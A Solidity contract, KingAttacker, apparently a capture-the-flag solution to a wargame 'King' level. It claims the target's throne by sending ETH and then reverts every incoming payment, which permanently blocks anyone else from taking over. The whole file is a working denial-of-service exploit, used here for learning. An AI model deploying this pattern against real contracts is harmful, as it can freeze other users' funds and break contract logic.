// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {

    // Receive Function
    receive() external payable {
        revert();
    }

    // Attack Function
    function attack(address king) public payable {
        (bool success, ) = payable(king).call {value: msg.value} ("");
        require(success, "Failed to send ETH"); 
    }
}